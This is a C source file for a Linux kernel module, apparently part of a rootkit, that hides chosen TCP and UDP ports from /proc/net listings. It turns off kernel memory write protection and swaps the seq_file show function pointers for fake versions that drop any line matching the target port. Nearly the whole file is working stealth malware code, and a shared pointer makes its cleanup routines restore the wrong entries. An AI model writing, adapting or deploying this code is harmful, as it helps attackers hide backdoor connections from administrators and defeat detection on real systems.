#include "../header/hide.h"


int tcp4 = INT_MAX;
int tcp6 = INT_MAX;
int udp4 = INT_MAX;
int udp6 = INT_MAX;

module_param(tcp4, int, S_IRUSR | S_IWUSR | S_IRGRP);
module_param(tcp6, int, S_IRUSR | S_IWUSR | S_IRGRP);
module_param(udp4, int, S_IRUSR | S_IWUSR | S_IRGRP);
module_param(udp6, int, S_IRUSR | S_IWUSR | S_IRGRP);

MODULE_PARM_DESC(tcp4, "tcp4 port.");
MODULE_PARM_DESC(tcp6, "tcp6 port.");
MODULE_PARM_DESC(udp4, "udp4 port.");
MODULE_PARM_DESC(udp6, "udp6 port.");


unsigned long * seq_show_addr;

int (*real_seq_show_tcp4)(struct seq_file *seq, void *v);
int (*real_seq_show_tcp6)(struct seq_file *seq, void *v);
int (*real_seq_show_udp4)(struct seq_file *seq, void *v);
int (*real_seq_show_udp6)(struct seq_file *seq, void *v);


int fake_seq_show_tcp4(struct seq_file *seq, void *v) {
    int ret;
    size_t last_count, last_size;

    char needle[NEEDLE_LEN];

    last_count = seq->count;
    snprintf(needle, NEEDLE_LEN, ":%04X", tcp4);
    ret = real_seq_show_tcp4(seq, v);
    last_size = seq->count - last_count;

    if (strnstr(seq->buf + seq->count - last_size, needle, last_size)) {
        printk(KERN_INFO "Hiding port %d using needle %s.\n", tcp4, needle);
        seq->count -= last_size; 
    }

    return ret;
}

int fake_seq_show_tcp6(struct seq_file *seq, void *v) {
    int ret;
    size_t last_count, last_size;

    char needle[NEEDLE_LEN];

    last_count = seq->count;
    snprintf(needle, NEEDLE_LEN, ":%04X", tcp6);
    ret = real_seq_show_tcp6(seq, v);
    last_size = seq->count - last_count;

    if (strnstr(seq->buf + seq->count - last_size, needle, last_size)) {
        printk(KERN_INFO "Hiding port %d using needle %s.\n", tcp6, needle);
        seq->count -= last_size; 
    }

    return ret;
}

int fake_seq_show_udp4(struct seq_file *seq, void *v) {
    int ret;
    size_t last_count, last_size;

    char needle[NEEDLE_LEN];

    last_count = seq->count;
    snprintf(needle, NEEDLE_LEN, ":%04X", udp4);
    ret = real_seq_show_udp4(seq, v);
    last_size = seq->count - last_count;

    if (strnstr(seq->buf + seq->count - last_size, needle, last_size)) {
        printk(KERN_INFO "Hiding port %d using needle %s.\n", udp4, needle);
        seq->count -= last_size; 
    }

    return ret;
}

int fake_seq_show_udp6(struct seq_file *seq, void *v) {
    int ret;
    size_t last_count, last_size;

    char needle[NEEDLE_LEN];

    last_count = seq->count;
    snprintf(needle, NEEDLE_LEN, ":%04X", udp6);
    ret = real_seq_show_udp6(seq, v);
    last_size = seq->count - last_count;

    if (strnstr(seq->buf + seq->count - last_size, needle, last_size)) {
        printk(KERN_INFO "Hiding port %d using needle %s.\n", udp6, needle);
        seq->count -= last_size; 
    }

    return ret;
}

void hook_show_tcp4(void) {
    struct file *filp;
    struct seq_file *test;
    filp = filp_open(TCP4_NET_ENTRY, O_RDONLY, 0);

    test = (struct seq_file*) filp->private_data;
    real_seq_show_tcp4 = test->op->show;

    seq_show_addr = (unsigned long*)&test->op->show;
    unprotect_memory();
    *seq_show_addr = (unsigned long)fake_seq_show_tcp4;
    protect_memory();
}

void hook_show_tcp6(void) {
    struct file *filp;
    struct seq_file *test;
    filp = filp_open(TCP6_NET_ENTRY, O_RDONLY, 0);

    test = (struct seq_file*) filp->private_data;
    real_seq_show_tcp6 = test->op->show;

    seq_show_addr = (unsigned long*)&test->op->show;
    unprotect_memory();
    *seq_show_addr = (unsigned long)fake_seq_show_tcp6;
    protect_memory();
}

void hook_show_udp4(void) {
    struct file *filp;
    struct seq_file *test;
    filp = filp_open(UDP4_NET_ENTRY, O_RDONLY, 0);

    test = (struct seq_file*) filp->private_data;
    real_seq_show_udp4 = test->op->show;

    seq_show_addr = (unsigned long*)&test->op->show;
    unprotect_memory();
    *seq_show_addr = (unsigned long)fake_seq_show_udp4;
    protect_memory();
}

void hook_show_udp6(void) {
    struct file *filp;
    struct seq_file *test;
    filp = filp_open(UDP6_NET_ENTRY, O_RDONLY, 0);

    test = (struct seq_file*) filp->private_data;
    real_seq_show_udp6 = test->op->show;

    seq_show_addr = (unsigned long*)&test->op->show;
    unprotect_memory();
    *seq_show_addr = (unsigned long)fake_seq_show_udp6;
    protect_memory();
}

void hook_cleanup_tcp4(void) {
    unprotect_memory();
    *seq_show_addr = (unsigned long)real_seq_show_tcp4;
    protect_memory();
}

void hook_cleanup_tcp6(void) {
    unprotect_memory();
    *seq_show_addr = (unsigned long)real_seq_show_tcp6;
    protect_memory();
}

void hook_cleanup_udp4(void) {
    unprotect_memory();
    *seq_show_addr = (unsigned long)real_seq_show_udp4;
    protect_memory();
}

void hook_cleanup_udp6(void) {
    unprotect_memory();
    *seq_show_addr = (unsigned long)real_seq_show_udp6;
    protect_memory();
}

void port_hide(void) {
    hook_show_tcp4();
    hook_show_tcp6();
    hook_show_udp4();
    hook_show_udp6();
}

void port_unhide(void) {
    hook_cleanup_tcp4();
    hook_cleanup_tcp6();
    hook_cleanup_udp4();
    hook_cleanup_udp6();
}